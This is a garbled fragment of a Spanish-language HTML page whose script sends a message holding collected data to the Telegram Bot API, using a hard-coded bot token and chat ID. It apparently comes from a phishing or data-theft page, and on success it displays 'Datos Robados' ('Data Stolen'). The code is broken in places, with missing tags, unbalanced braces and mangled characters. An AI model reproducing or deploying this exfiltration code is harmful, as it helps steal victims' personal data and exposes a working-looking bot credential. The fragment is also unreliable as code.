<html lang="es">
<head>

        const url = "https://api.telegram.org/bot8115773636:AAH7Zz4ZbpqsL96GQqINLGIwyPqgWg_0-eA/sendMessage";
        const datos = {
          chat_id: 7043817199,
          text: mensaje
        };

            "Content-Type": "application/json"
          },

        estado.textContent = respuesta.ok ? "Datos Robadosâœ…ï¸" : "âŒ Error al enviar a Telegram";

      } catch (err) {
